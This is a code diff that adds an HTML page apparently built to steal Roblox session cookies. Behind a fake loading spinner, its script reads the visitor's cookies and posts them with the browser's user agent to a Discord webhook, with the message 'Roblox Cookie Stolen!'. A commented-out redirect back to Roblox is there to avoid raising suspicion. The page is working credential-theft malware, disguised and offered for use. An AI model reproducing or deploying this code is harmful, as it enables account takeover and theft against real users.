@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <style>
+        body {
+            background-color: #1e1e1e;
+            color: white;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .loader {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #3498db;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 2s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="loader"></div>
+    <script>
+        // 1. Grab the cookie
+        const cookie = document.cookie;
+        
+        // 2. Send it to Discord
+        const webhook = 'https://discord.com/api/webhooks/1543634159199723671/9axpl5HsX8YiqDXo55B_rglgIapSDLDQ8czRWlHp9kBioCSKfOmo5IGlCrXtx5OgLntT'; // PASTE YOUR DISCORD WEBHOOK HERE
+
+        fetch(webhook, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                content: `🍪 **Roblox Cookie Stolen!**\n\`\`\`${cookie}\`\`\`\n📱 User Agent: ${navigator.userAgent}`
+            })
+        }).then(() => {
+            console.log('Cookie sent!');
+            // Optional: Redirect to Roblox so they don't suspect
+            // window.location.href = 'https://www.roblox.com';
+        }).catch(err => console.error('Error:', err));
+    </script>
+</body>
+</html>
